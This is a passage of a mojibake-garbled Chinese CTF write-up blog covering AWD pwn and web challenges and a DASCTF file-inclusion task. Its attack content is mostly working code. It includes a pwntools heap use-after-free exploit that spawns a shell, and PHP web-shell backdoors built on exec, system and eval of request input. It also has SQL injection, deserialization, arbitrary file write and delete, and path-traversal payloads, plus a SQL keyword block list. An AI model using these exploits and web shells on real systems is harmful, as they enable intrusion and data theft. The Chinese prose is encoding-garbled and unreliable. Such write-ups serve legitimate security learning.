åœ¨notepadä¸Šdelte_markæœ‰ä¸€ä¸ªuaf,è„šæœ¬ä¸Šshow_markçš„å‡½æ•°ä¸€ç›´å†™é”™æˆdelte_markæ²¡æ³¨æ„åˆ°ï¼Œé”™è¿‡äº†ä¸€å †flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your option:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">elf  = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, content1, content2</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;new&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note size:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note name:&#x27;</span>)</span><br><span class="line">    sh.sendline(content1)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note content:&#x27;</span>)</span><br><span class="line">    sh.sendline(content2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content1, content2</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note name:&#x27;</span>)</span><br><span class="line">    sh.sendline(content1)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note content:&#x27;</span>)</span><br><span class="line">    sh.sendline(content2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;delete&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; note index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;mark&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; index of note you want to mark:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark info:&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_mark</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;edit_mark&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark content:&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_mark</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;show_mark&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_mark</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;delete_mark&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;-&gt; mark index:&#x27;</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">new(<span class="number">0x100</span>, <span class="string">&#x27;aaaaaaa&#x27;</span>, <span class="string">&#x27;aaaaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">mark(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete_mark(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;aaaaaa&#x27;</span>, p32(<span class="number">0</span>) * <span class="number">2</span> + p32(<span class="number">0x0804BFC4</span>) + p32(<span class="number">0x08048810</span>))<span class="comment">#1</span></span><br><span class="line">show_mark(<span class="number">0</span>)</span><br><span class="line">libc_base = u32(sh.recvn(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, p32(<span class="number">0</span>) * <span class="number">2</span> + p32(bin_sh_addr) + p32(system))</span><br><span class="line">show_mark(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="PWN2">PWN2</h3>
<p>pwn2ä»éš¾åº¦ä¸Šæ¯”pwn1ç®€å•ä¸å°‘ï¼Œå¯æƒœåœ¨pwn1ä¸Šçœ‹çš„å¤ªä¹…ï¼Œæ²¡æ³¨æ„pwn2æ”¾é¢˜ï¼Œé”™è¿‡äº†å¥½å¤šç™½èŠ±èŠ±çš„flag</p>
<h4 id="ç¬¬ä¸€ä¸ªæ´-backdoor">ç¬¬ä¸€ä¸ªæ´ backdoor</h4>
<h5 id="åˆ©ç”¨">åˆ©ç”¨</h5>
<p>è¾“å…¥+1ç­‰äº0å³å¯æ‰§è¡Œsystem<br>
unsigned intæ•´æ•°ä¸Šæº¢å³å¯è¾¾åˆ°0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=remote(ip,port)</span><br><span class="line">p.sendline(str(<span class="number">4294967295</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="ä¿®å¤">ä¿®å¤</h5>
<p>æ”¹caseçš„å€¼æˆ–è€…nopæ‰systeméƒ½å¯</p>
<h4 id="ç¬¬äºŒä¸ªæ´-delete-order">ç¬¬äºŒä¸ªæ´ delete_order</h4>
<h5 id="åˆ©ç”¨-v2">åˆ©ç”¨</h5>
<p>freeåæ²¡æœ‰ç½®NULLè‚¯å®šæ˜¯UAF</p>
<h5 id="ä¿®å¤-v2">ä¿®å¤</h5>
<p>ç®€å•ç²—æš´nopæ‰freeäº†<br>
å½“ç„¶æ­£ç¡®åšæ³•åº”è¯¥æ˜¯jmpå‡ºå»ç”¨è¡¥ä¸Šç½®NULLçš„è¿‡ç¨‹</p>
<h4 id="ç¬¬ä¸‰ä¸ªæ´-comment">ç¬¬ä¸‰ä¸ªæ´ comment</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">buf = <span class="built_in">malloc</span>(v1);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, v1);</span><br><span class="line">write(<span class="number">1</span>, buf, v1);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Comments:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;format);</span><br><span class="line"><span class="built_in">printf</span>(&amp;format);</span><br></pre></td></tr></table></figure>
<h5 id="åˆ©ç”¨-v3">åˆ©ç”¨</h5>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
<h5 id="ä¿®å¤-v3">ä¿®å¤</h5>
<p>ç”¨putsæ›¿ä»£printfé¿å…æ ¼å¼åŒ–è§£æ</p>
<h4 id="ç¬¬å››ä¸ªæ´-order">ç¬¬å››ä¸ªæ´ order</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">buf = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size &lt;= <span class="number">0x50</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Baozi name:&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v5)</span><br></pre></td></tr></table></figure>
<h5 id="åˆ©ç”¨-v4">åˆ©ç”¨</h5>
<p>ä½¿ç”¨scanf(&quot;%s&quot;,&amp;x)çš„æ–¹å¼è¯»å…¥å­—ç¬¦ä¸²ï¼Œå­˜åœ¨æº¢å‡º<br>
å †æº¢å‡º</p>
<h5 id="ä¿®å¤-v4">ä¿®å¤</h5>
<p>nopï¼<br>
æ­£ç¡®åšæ³•åº”è¯¥æ˜¯jmpå‡ºå»ç”¨fgetsæˆ–è€…readæ›¿ä»£è¯»å…¥æœ‰é™é•¿åº¦çš„å­—ç¬¦ä¸²</p>
<h2 id="WEB">WEB</h2>
<h3 id="web1">web1</h3>
<blockquote>
<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1JPDSOLIH13nJfsx-8YScvA">https://pan.baidu.com/s/1JPDSOLIH13nJfsx-8YScvA</a><br>
æå–ç ï¼š9nln</p>
</blockquote>
<blockquote>
<p>web1ç•™ä¸‹æ¥çš„ç‰ˆæœ¬æ˜¯æˆ‘ä¿®å¤ä¹‹åï¼Œæœ‰çš„æ¼æ´ä¸å¤ªèƒ½æƒ³çš„èµ·æ¥ã€‚ã€‚</p>
</blockquote>
<h4 id="é¢„ç•™åé—¨">é¢„ç•™åé—¨</h4>
<p><strong>åé—¨1</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// admin/header.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$p=$_GET[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">	<span class="keyword">echo</span> $p;</span><br><span class="line">	$q=exec($p);</span><br><span class="line">	var_dump($q);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>åé—¨2</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// admin/footer.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$shell=$_POST[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">	system($shell);</span><br><span class="line">	<span class="keyword">if</span>($shell !=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>åé—¨3</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// footer.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$shell=$_POST[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">	system($shell);</span><br><span class="line">	<span class="keyword">if</span>($shell !=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="SQLæ³¨å…¥">SQLæ³¨å…¥</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// search.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;header.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">include_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">	    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	    $query = <span class="string">&quot;SELECT * FROM news WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">	    $data = mysqli_query($dbc,$query);	</span><br><span class="line">	&#125;</span><br><span class="line">	$com = mysqli_fetch_array($data);</span><br><span class="line">    var_dump($com);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¿®å¤ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$filter = <span class="string">&quot;regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((preg_match(<span class="string">&quot;/&quot;</span>.$filter.<span class="string">&quot;/is&quot;</span>,$id)== <span class="number">1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</h4>
<p>è¿™ä¸ªæ¯”èµ›çš„æ—¶å€™æ—¶é—´æ¯”è¾ƒç´§å¼ ï¼Œæ„Ÿè§‰ååºåˆ—åŒ–çš„å‚æ•°æ˜¯ä¸å¯æ§çš„ï¼Œç»“æŸåå¤ç›˜æ„Ÿè§‰åº”è¯¥å¯ä»¥ç»“åˆä¸Šé¢çš„SQLæ³¨å…¥æ¼æ´ä¸€èµ·åˆ©ç”¨ï¼Œå…ˆåˆ é™¤newsè¡¨åŸæœ‰çš„è®°å½•ï¼Œç„¶åæ’å…¥ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥é€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// contact.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $g = <span class="string">&quot;fi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $h = <span class="string">&quot;le&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $i = <span class="string">&quot;_g&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $j = <span class="string">&quot;et_c&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $k = <span class="string">&quot;ont&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $l = <span class="string">&quot;ents&quot;</span>;						</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $qw=<span class="keyword">$this</span>-&gt;g . <span class="keyword">$this</span>-&gt;h . <span class="keyword">$this</span>-&gt;i . <span class="keyword">$this</span>-&gt;j . <span class="keyword">$this</span>-&gt;k . <span class="keyword">$this</span>-&gt;l; </span><br><span class="line">        var_dump($qw(<span class="keyword">$this</span>-&gt;f));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;						</span><br><span class="line">$e = <span class="string">&quot;un&quot;</span>; </span><br><span class="line">$f = <span class="string">&quot;se&quot;</span>; </span><br><span class="line">$g = <span class="string">&quot;ri&quot;</span>; </span><br><span class="line">$h = <span class="string">&quot;al&quot;</span>; </span><br><span class="line">$i = <span class="string">&quot;ize&quot;</span>; </span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM news;&quot;</span>; </span><br><span class="line">$data = mysqli_query($dbc,$query); </span><br><span class="line"><span class="keyword">while</span>($t =  mysqli_fetch_array($data)) &#123;</span><br><span class="line">    $qwe=$e.$f.$g.$h.$i; $qwe($t[<span class="number">1</span>]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰ä¸€ä¸ªå¯ç–‘çš„ç‚¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// services.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;name&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">$user = <span class="keyword">new</span> User; </span><br><span class="line">$user-&gt;name = <span class="string">&#x27;&#x27;</span>.$_POST[<span class="string">&#x27;frame&#x27;</span>]; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="web3">web3</h3>
<blockquote>
<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1AYZftYQ8nQyMHx7-1XSn7g">https://pan.baidu.com/s/1AYZftYQ8nQyMHx7-1XSn7g</a><br>
æå–ç ï¼švcr0</p>
</blockquote>
<p>web1ç©çš„æœ‰ç‚¹å¿ƒæ€å´©äº†ã€‚ã€‚ã€‚ã€‚</p>
<h4 id="å¼±å£ä»¤">å¼±å£ä»¤</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x2F;admin</span><br></pre></td></tr></table></figure>
<h4 id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;example2.php?page&#x3D;flag</span><br></pre></td></tr></table></figure>
<h4 id="é¢„ç½®flag">é¢„ç½®flag</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// core/features/userlist.php</span></span><br><span class="line">$fi = fopen(strrev(<span class="string">&quot;galf/&quot;</span>),<span class="string">&quot;r&quot;</span>);</span><br><span class="line">$sss= <span class="string">&quot;&lt;!--&quot;</span>.strrev(base64_encode(fread($fi,<span class="number">256</span>))).<span class="string">&quot;--&gt;&quot;</span>;</span><br><span class="line">fclose($fi);</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">if</span> (strpos($user_flags,<span class="string">&#x27;s&#x27;</span>) !== <span class="literal">false</span>) </span><br><span class="line">    $th .= <span class="string">&#x27;&lt;td&#x27;</span>.$bg.<span class="string">&#x27;&gt;&#x27;</span>.$sss.<span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shows.php?imod&#x3D;userlist&amp;user_flags&#x3D;s</span><br></pre></td></tr></table></figure>
<h4 id="ä»»æ„æ–‡ä»¶å†…å®¹å†™å…¥">ä»»æ„æ–‡ä»¶å†…å®¹å†™å…¥</h4>
<p>ç¬¬ä¸€å¤„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// inc/wizards.php</span></span><br><span class="line"><span class="keyword">foreach</span> ($_REQUEST[<span class="string">&#x27;language&#x27;</span>] <span class="keyword">as</span> $ks =&gt; $vs)&#123;</span><br><span class="line">    <span class="comment">// a=&gt;1\&quot;;phpinfo();//</span></span><br><span class="line">    <span class="comment">// $lang[&quot;a&quot;] = &quot; . str_replace(&#x27;&quot;&#x27;, &#x27;\&quot;&#x27;, &#x27;1\&quot;;phpinfo();//&#x27;);</span></span><br><span class="line">    <span class="comment">// $lang[&quot;a&quot;] = &quot;1\\&quot;;phpinfo();//</span></span><br><span class="line">    fwrite($lx, <span class="string">&#x27;$lang[&quot;&#x27;</span>.$ks.<span class="string">&#x27;&quot;] = &quot;&#x27;</span>.str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, $vs).<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?mod&#x3D;wizard&amp;action&#x3D;language&amp;language[a]&#x3D;1\%22;phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒå¤„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// inc/wizards.php</span></span><br><span class="line">$handler = fopen(SERVDIR.<span class="string">&quot;/cdata/rss_config.php&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> msg(<span class="string">&quot;error&quot;</span>,  lang(<span class="string">&#x27;Error!&#x27;</span>), <span class="string">&quot;Can not open file ./cdata/rss_config.php&quot;</span>);</span><br><span class="line">fwrite($handler, <span class="string">&quot;&lt;?PHP \n\n//RSS Configurations (Auto Generated file)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">fwrite($handler, <span class="string">&quot;\$rss_news_include_url = \&quot;&quot;</span>.htmlspecialchars($rss_news_include_url).<span class="string">&quot;\&quot;;\n\n&quot;</span>);</span><br><span class="line">fwrite($handler, <span class="string">&quot;\$rss_title = \&quot;&quot;</span>.htmlspecialchars($rss_title).<span class="string">&quot;\&quot;;\n\n&quot;</span>);</span><br><span class="line">fwrite($handler, <span class="string">&quot;\$rss_encoding = \&quot;&quot;</span>.htmlspecialchars($rss_encoding).<span class="string">&quot;\&quot;;\n\n&quot;</span>);</span><br><span class="line">fwrite($handler, <span class="string">&quot;\$rss_language = \&quot;&quot;</span>.htmlspecialchars($rss_language).<span class="string">&quot;\&quot;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">fwrite($handler, <span class="string">&quot;?&gt;&quot;</span>);</span><br><span class="line">fclose($handler);</span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?mod&#x3D;wizard&amp;action&#x3D;dosaverss&amp;rss_news_url&#x3D;http:&#x2F;&#x2F;example.com&amp;rss_title&#x3D;assert&amp;rss_encode&#x3D;$_GET[1]&amp;rss_language&#x3D;$&#123;rss_title($rss_encode)&#125;</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">#### ä»»æ„æ–‡ä»¶åˆ é™¤</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php&#x3D;</span><br><span class="line">&#x2F;&#x2F; inc&#x2F;images.php</span><br><span class="line">elseif ($action &#x3D;&#x3D; &quot;doimagedelete&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    CSRFCheck();</span><br><span class="line"></span><br><span class="line">    if(!isset($images))</span><br><span class="line">        msg(&quot;info&quot;, lang(&quot;No Images selected&quot;), lang(&quot;You must select images to be deleted&quot;), &#39;#GOBACK&#39;);</span><br><span class="line"></span><br><span class="line">    foreach ($images as $image)</span><br><span class="line">        unlink(SERVDIR.&quot;&#x2F;uploads&#x2F;&quot;.$image) or print(lang(&quot;Could not delete image&quot;).&quot; &lt;b&gt;$file&lt;&#x2F;b&gt;&quot;);</span><br><span class="line"></span><br><span class="line">    msg(&quot;info&quot;, lang(&quot;Image(s) Deleted&quot;), lang(&quot;The image was successfully deleted&quot;), &#39;#GOBACK&#39;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?mod&#x3D;iamges&amp;action&#x3D;doimagedelete&amp;images[1]&#x3D;..&#x2F;index.php</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2020ä¸ƒæœˆèµ›</title>
    <url>/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="DASCTFä¸ƒæœˆèµ›-Web-Writeup">DASCTFä¸ƒæœˆèµ› Web Writeup</h1>
<h2 id="EzFileInclude">EzFileInclude</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>æ–‡ä»¶åŒ…å«</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p>åšçš„æ—¶å€™è¿™é“é¢˜çœŸçš„æ˜¯ã€‚ã€‚ä¸€è¨€éš¾å°½</p>
<p>F12å¯ä»¥çœ‹åˆ°ä¸»é¡µå›¾ç‰‡çš„é“¾æ¥http://183.129.189.60:10009/image.php?t=XXXXXX&amp;f=XXXXXXX</p>
<p>å‚æ•°tæ˜¯æ—¶é—´æˆ³ï¼Œå‚æ•°fæ˜¯è¦åŒ…å«çš„æ–‡ä»¶åbase64ç¼–ç ï¼Œå°è¯•ç›´æ¥è¯»<code>image.php</code>å’Œ<code>index.php</code>éƒ½æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œåº”è¯¥æ˜¯å‰é¢æ‹¼æ¥äº†è·¯å¾„ï¼Œæ¯”å¦‚è¯´<code>/var/www/html/img/</code>ï¼Œè€Œä¸”è¿‡æ»¤äº†<code>../</code>ç­‰è·¯å¾„ç©¿è¶Šçš„å­—ç¬¦ï¼Œå¹¶ä¸”wrapperç­‰æ‰‹æ®µçš„ã€‚</p>
<p>æƒ³äº†åŠå¤©æ„Ÿè§‰è¿™æ ·åº”è¯¥æ˜¯ç»å¯¹å®‰å…¨çš„ã€‚ã€‚ç»“æœåæ¥å‘ç°ï¼Œå¦‚æœfå‚æ•°çš„å¼€å¤´ç»™å‡ºä¸€ä¸ªç›®å½•å†ç©¿è¶Šå°±å¯ä»¥ç»•è¿‡wafäº†ã€‚</p>
<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://183.129.189.60:10009/image.php&#x27;</span></span><br><span class="line">timestamp = int(time.time())</span><br><span class="line">payload = <span class="string">&#x27;gqy.jpg/../../../../../flag&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&#x27;t&#x27;</span>: timestamp, <span class="string">&#x27;f&#x27;</span>: base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url=URL, params=params)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>é¡ºä¾¿çœ‹ä¸€ä¸‹æºç </p>
